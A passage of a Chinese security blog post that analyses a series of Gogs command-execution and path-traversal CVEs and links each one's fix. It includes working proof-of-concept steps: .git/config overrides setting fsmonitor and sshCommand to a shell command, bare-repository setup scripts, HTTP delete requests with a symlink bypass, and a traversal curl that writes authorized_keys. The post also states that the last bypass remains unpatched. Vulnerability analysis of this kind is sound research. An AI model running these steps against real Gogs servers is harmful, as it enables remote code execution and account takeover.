+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702135844403.png" class="" title="image-20250702135844403">
+
+<p>此时文件系统会存在该仓库的临时工作目录：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702140226291.png" class="" title="image-20250702140226291">
+
+
+
+<p>然后上传的文件会复制进指定目录：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702140727714.png" class="" title="image-20250702140727714">
+
+<p>接下来会在该仓库目录执行<code>git add</code> <code>git commit</code> <code>git push</code>命令将变动同步到原裸仓库中。</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702141305194.png" class="" title="image-20250702141305194">
+
+
+
+<p>其中拼接到路径中的TreePath没有经过检查，并且用户可以在请求中设置该值，所以导致用户可以上传任意文件到.git目录，那么就可以覆盖.git&#x2F;config文件，通过core.fsmonitor执行任意命令（将会在<code>git add</code>和<code>git commit</code>时触发）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion = 0</span><br><span class="line">	filemode = true</span><br><span class="line">	bare = false</span><br><span class="line">	logallrefupdates = true</span><br><span class="line">	fsmonitor = sh -c &quot;whoami &gt; /tmp/success&quot;</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">	url = /data/git/gogs-repositories/test/testrepo.git</span><br><span class="line">	fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;master&quot;]</span><br><span class="line">	remote = origin</span><br><span class="line">	merge = refs/heads/master</span><br></pre></td></tr></table></figure>
+
+
+
+<p>也可以设置core.sshCommand并将url设置为git地址（将会在<code>git push</code>时触发）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[core]</span><br><span class="line">	repositoryformatversion = 0</span><br><span class="line">	filemode = true</span><br><span class="line">	bare = false</span><br><span class="line">	logallrefupdates = true</span><br><span class="line">	sshCommand = sh -c &quot;whoami &gt; /tmp/success&quot;</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">	url = git@localhost:test/testrepo.git</span><br><span class="line">	fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">[branch &quot;master&quot;]</span><br><span class="line">	remote = origin</span><br><span class="line">	merge = refs/heads/master</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/commit/0fef3c9082269e9a4e817274942a5d7c50617284">https://github.com/gogs/gogs/commit/0fef3c9082269e9a4e817274942a5d7c50617284</a></p>
+<p>对TreePath也进行了检查：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702151439054.png" class="" title="image-20250702151439054">
+
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702151515085.png" class="" title="image-20250702151515085">
+
+
+
+<h2 id="CVE-2022-1884"><a href="#CVE-2022-1884" class="headerlink" title="CVE-2022-1884"></a>CVE-2022-1884</h2><p>影响范围 &lt;0.12.8</p>
+<h3 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>参考 <a target="_blank" rel="noopener" href="https://huntr.com/bounties/9cd4e7b7-0979-4e5e-9a1c-388b58dea76b">https://huntr.com/bounties/9cd4e7b7-0979-4e5e-9a1c-388b58dea76b</a> ，将TreePath设置为<code>.git.</code>可以绕过isRepositoryGitPath函数检查。但<code>.git.</code>仅在Windows下被视为<code>.git</code>。</p>
+<h3 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/pull/6970/files">https://github.com/gogs/gogs/pull/6970/files</a></p>
+<p>添加了<code>.git.</code>：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702154846712.png" class="" title="image-20250702154846712">
+
+
+
+<h2 id="CVE-2022-1986"><a href="#CVE-2022-1986" class="headerlink" title="CVE-2022-1986"></a>CVE-2022-1986</h2><p>影响范围 &lt;&#x3D;0.12.8</p>
+<h3 id="漏洞原理-1"><a href="#漏洞原理-1" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>参考 <a target="_blank" rel="noopener" href="https://huntr.com/bounties/776e8f29-ff5e-4501-bb9f-0bd335007930">https://huntr.com/bounties/776e8f29-ff5e-4501-bb9f-0bd335007930</a> ，编辑文件时设置tree_path为<code>.git/config</code>可以绕过，不过也仅在Windows下可以，因为在Windows下<code>os.PathSeparator</code>为<code>\</code>，但<code>/</code>可以正常作为路径分隔符使用。</p>
+<h3 id="漏洞修复-2"><a href="#漏洞修复-2" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/commit/38aff73251cc46ced96dd608dab6190415032a82">https://github.com/gogs/gogs/commit/38aff73251cc46ced96dd608dab6190415032a82</a></p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702160049315.png" class="" title="image-20250702160049315">
+
+
+
+<h2 id="CVE-2022-2024"><a href="#CVE-2022-2024" class="headerlink" title="CVE-2022-2024"></a>CVE-2022-2024</h2><p>影响范围 &lt; 0.12.11</p>
+<h3 id="漏洞原理-2"><a href="#漏洞原理-2" class="headerlink" title="漏洞原理"></a>漏洞原理</h3><p>参考 <a target="_blank" rel="noopener" href="https://huntr.com/bounties/18cf9256-23ab-4098-a769-85f8da130f97">https://huntr.com/bounties/18cf9256-23ab-4098-a769-85f8da130f97</a> ，可以设置<code>tree_path</code>为<code>/.Git/</code>以在不区分路径大小写的系统上实现绕过，如Windows和MacOS。</p>
+<h3 id="漏洞修复-3"><a href="#漏洞修复-3" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/commit/15d0d6a94be0098a8227b6b95bdf2daed105ec41">https://github.com/gogs/gogs/commit/15d0d6a94be0098a8227b6b95bdf2daed105ec41</a></p>
+<p>在isRepositoryGitPath函数中首先进行<code>strings.ToLower(path)</code>：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702161606057.png" class="" title="image-20250702161606057">
+
+
+
+<h2 id="CVE-2024-39931"><a href="#CVE-2024-39931" class="headerlink" title="CVE-2024-39931"></a>CVE-2024-39931</h2><p>影响范围 &lt;&#x3D;0.13.0</p>
+<h3 id="调试环境搭建-1"><a href="#调试环境搭建-1" class="headerlink" title="调试环境搭建"></a>调试环境搭建</h3><p>源码版本选择了0.13.0，从Dockerfile看到使用了Task编译Gogs源码，修改Taskfile.yml以支持调试：</p>
+<figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">tasks:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">cmds:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">go</span> <span class="string">build</span> <span class="string">-v</span></span><br><span class="line">        <span class="string">-gcflags=&quot;all=-N</span> <span class="string">-l&quot;</span></span><br><span class="line">        <span class="string">-ldflags</span> <span class="string">&#x27;</span></span><br><span class="line"><span class="string">          -X &quot;<span class="template-variable">&#123;&#123;.PKG_PATH&#125;&#125;</span>.BuildTime=<span class="template-variable">&#123;&#123;.BUILD_TIME&#125;&#125;</span>&quot;</span></span><br><span class="line"><span class="string">          -X &quot;<span class="template-variable">&#123;&#123;.PKG_PATH&#125;&#125;</span>.BuildCommit=<span class="template-variable">&#123;&#123;.BUILD_COMMIT&#125;&#125;</span>&quot;</span></span><br><span class="line"><span class="string">        &#x27;</span></span><br><span class="line">        <span class="string">-tags</span> <span class="string">&#x27;<span class="template-variable">&#123;&#123;.TAGS&#125;&#125;</span>&#x27;</span></span><br><span class="line">        <span class="string">-trimpath</span> <span class="string">-o</span> <span class="string">gogs&#123;&#123;.BINARY_EXT&#125;&#125;</span></span><br><span class="line">    <span class="attr">vars:</span></span><br><span class="line">      <span class="attr">BUILD_COMMIT:</span> <span class="string">test</span></span><br></pre></td></tr></table></figure>
+
+<p>修改Dockerfile以安装Delve：</p>
+<figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#FROM alpine:3.17</span></span><br><span class="line"><span class="keyword">FROM</span> golang:alpine3.<span class="number">17</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> go install github.com/go-delve/delve/cmd/dlv@v1.21.0</span></span><br></pre></td></tr></table></figure>
+
+<p>修改docker&#x2F;s6&#x2F;gogs&#x2F;run以Delve启动应用：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash"><span class="built_in">exec</span> gosu <span class="string">&quot;<span class="variable">$USER</span>&quot;</span> /app/gogs/gogs web</span></span><br><span class="line">exec gosu &quot;$USER&quot; dlv --listen=:2345 --headless=true --api-version=2 --accept-multiclient exec /app/gogs/gogs --continue -- web</span><br></pre></td></tr></table></figure>
+
+<p>构建镜像并启动：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker build . -t gogs_debug:0.13.0</span><br><span class="line">docker run --rm --name gogs -p 10022:22 -p 10880:3000 -p 2345:2345 gogs_debug:0.13.0</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞复现与分析-1"><a href="#漏洞复现与分析-1" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h3><p>新建仓库，并在其中创建一个裸仓库：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">git clone http://127.0.0.1:10880/test/testrepo.git</span><br><span class="line">cd testrepo</span><br><span class="line">git init --bare</span><br><span class="line">cat &gt;&gt; config &lt;&lt;EOF</span><br><span class="line">	sshCommand = sh -c &quot;whoami &gt; /tmp/success&quot;</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">	url = git@localhost:test/testrepo.git</span><br><span class="line">	fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">EOF</span><br><span class="line">touch objects/info/.keep objects/pack/.keep refs/heads/.keep refs/tags/.keep</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;test&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在Web界面删除文件抓包得到接口，并用来删除<code>.git/HEAD</code>文件：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/testrepo/_delete/main/.git/HEAD</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>然后再在Web界面新建或上传文件，将会触发<code>git fetch</code>操作，而此时<code>.git/HEAD</code>文件已经被删除，git将会检查当前目录是否是有效裸仓库，那么在config中的配置将会生效。具体可以参考 <a target="_blank" rel="noopener" href="https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-2/">https://www.sonarsource.com/blog/securing-developer-tools-unpatched-code-vulnerabilities-in-gogs-2/</a></p>
+<h3 id="漏洞修复-4"><a href="#漏洞修复-4" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/pull/7870/files">https://github.com/gogs/gogs/pull/7870/files</a></p>
+<p>删除文件时进行了路径检查：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250703135433896.png" class="" title="image-20250703135433896">
+
+
+
+
+
+<h2 id="CVE-2024-54148"><a href="#CVE-2024-54148" class="headerlink" title="CVE-2024-54148"></a>CVE-2024-54148</h2><p>影响范围 &lt;0.13.1</p>
+<h3 id="漏洞复现与分析-2"><a href="#漏洞复现与分析-2" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h3><p>依然使用0.12.5版本，在仓库创建指向<code>.git/config</code>的软链接：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702172059270.png" class="" title="image-20250702172059270">
+
+<p>直接提交修改的话，会提示无法编辑：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702172344945.png" class="" title="image-20250702172344945">
+
+<p>代码在<code>internal/route/repo/editor.go:122</code>，<code>entry.IsSymlink()</code>检测的是<code>tree_path</code>的值即新的文件路径：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702173308596.png" class="" title="image-20250702173308596">
+
+<p>所以只要修改文件路径就可以通过这里的检测，然后在<code>internal/db/repo_editor.go:UpdateRepoFile</code>中会将原文件移动到新路径并修改内容：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702173535587.png" class="" title="image-20250702173535587">
+
+<h3 id="漏洞修复-5"><a href="#漏洞修复-5" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/commit/c94baec9ca923f38c19f0c7c5af722b9ec04022a">https://github.com/gogs/gogs/commit/c94baec9ca923f38c19f0c7c5af722b9ec04022a</a></p>
+<p>对原文件也进行了检测：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702173848796.png" class="" title="image-20250702173848796">
+
+
+
+<h2 id="CVE-2024-55947"><a href="#CVE-2024-55947" class="headerlink" title="CVE-2024-55947"></a>CVE-2024-55947</h2><p>影响范围 &lt;0.13.1</p>
+<h3 id="漏洞复现与分析-3"><a href="#漏洞复现与分析-3" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h3><p>参考 <a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg">https://github.com/gogs/gogs/security/advisories/GHSA-qf5v-rp47-55gg</a> ，访问 <a target="_blank" rel="noopener" href="http://127.0.0.1:10880/user/settings/applications">http://127.0.0.1:10880/user/settings/applications</a> 生成令牌，然后使用以下接口即可目录穿越写入任意文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">curl --path-as-is -X PUT --url &quot;http://localhost:10880/api/v1/repos/test/testrepo/contents/../../../../../../../../home/git/.ssh/authorized_keys&quot; \</span><br><span class="line">-H &quot;Authorization: token e7f4413e74a53f535c3d3a68000e7f35c03ac880&quot; \</span><br><span class="line">-H &quot;Content-Type: application/json&quot; \</span><br><span class="line">--data &#x27;&#123;</span><br><span class="line">  &quot;message&quot;: &quot;an&quot;,</span><br><span class="line">  &quot;content&quot;: &quot;&lt;base64encoded: your ssh pub key&gt;&quot;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>源码<a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/archive/refs/tags/v0.13.0.zip">0.13.0</a>，代码位置在<code>internal/route/api/v1/repo/contents.go:PutContents</code>：</p>
+<p><code>treePath</code>传入了<code>UpdateRepoFile</code>：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702205054407.png" class="" title="image-20250702205054407">
+
+<p>在<code>UpdateRepoFile</code>中会直接使用该路径并写入内容：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702205308965.png" class="" title="image-20250702205308965">
+
+<h3 id="漏洞修复-6"><a href="#漏洞修复-6" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p><a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/commit/9a9388ace25bd646f5098cb9193d983332c34e41#diff-2061f8945100fdb89720c7f02832eca589c0370d6e488c7a6f062ede0f63b97d">https://github.com/gogs/gogs/commit/9a9388ace25bd646f5098cb9193d983332c34e41#diff-2061f8945100fdb89720c7f02832eca589c0370d6e488c7a6f062ede0f63b97d</a></p>
+<p>对路径进行了处理防止目录穿越：</p>
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250702204148336.png" class="" title="image-20250702204148336">
+
+
+
+<h2 id="CVE-2024-56731"><a href="#CVE-2024-56731" class="headerlink" title="CVE-2024-56731"></a>CVE-2024-56731</h2><h3 id="漏洞复现与分析-4"><a href="#漏洞复现与分析-4" class="headerlink" title="漏洞复现与分析"></a>漏洞复现与分析</h3><p>参考 <a target="_blank" rel="noopener" href="https://github.com/gogs/gogs/security/advisories/GHSA-wj44-9vcg-wjq7">https://github.com/gogs/gogs/security/advisories/GHSA-wj44-9vcg-wjq7</a> ，其实是对CVE-2024-39931的绕过，CVE-2024-39931对删除文件的路径进行了检查，防止删除.git目录下的文件，但是可以通过创建.git目录的软链接绕过检查。</p>
+<p>新建仓库，并在其中创建一个裸仓库，同时创建.git目录的软链接：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">git clone http://127.0.0.1:10880/test/testrepo.git</span><br><span class="line">cd testrepo</span><br><span class="line">git init --bare</span><br><span class="line">cat &gt;&gt; config &lt;&lt;EOF</span><br><span class="line">	sshCommand = sh -c &quot;whoami &gt; /tmp/success&quot;</span><br><span class="line">[remote &quot;origin&quot;]</span><br><span class="line">	url = git@localhost:test/testrepo.git</span><br><span class="line">	fetch = +refs/heads/*:refs/remotes/origin/*</span><br><span class="line">EOF</span><br><span class="line">touch objects/info/.keep objects/pack/.keep refs/heads/.keep refs/tags/.keep</span><br><span class="line">ln -s .git gitdir</span><br><span class="line">git add .</span><br><span class="line">git commit -m &quot;test&quot;</span><br><span class="line">git push</span><br></pre></td></tr></table></figure>
+
+
+
+<p>在Web界面删除文件抓包得到接口，尝试删除<code>.git/HEAD</code>文件会发现失败：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/testrepo/_delete/main/.git/HEAD</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2025/07/01/Gogs-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87%E5%8F%B2/image-20250703142658312.png" class="" title="image-20250703142658312">
+
+
+
+<p>通过软链接绕过：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/test/testrepo/_delete/main/gitdir/HEAD</span> <span class="meta">HTTP/1.1</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="漏洞修复-7"><a href="#漏洞修复-7" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>测试发现最新版本0.13.3也还未修复。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
+              <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" rel="tag"># 漏洞分析</a>
+              <a href="/tags/Golang/" rel="tag"># Golang</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2025/02/15/%E4%BD%BF%E7%94%A8PyTorch%E5%BE%AE%E8%B0%83BERT%E5%AE%9E%E7%8E%B0%E6%BC%8F%E6%B4%9E%E5%88%86%E7%B1%BB%E6%A8%A1%E5%9E%8B/" rel="prev" title="使用PyTorch微调BERT实现漏洞分类模型">
+                  <i class="fa fa-angle-left"></i> 使用PyTorch微调BERT实现漏洞分类模型
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">淚笑</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">95k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">5:47</span>
+  </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/sidebar.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/10.9.1/mermaid.min.js","integrity":"sha256-YbM1pG3wWnzhyYN49g5fPnen+2CKEFaZfopkkwSpNtY="}}</script>
+  <script src="/js/third-party/tags/mermaid.js"></script>
+
+
+
+
+
+  
+
+
+
+
+
+</body>
+</html>
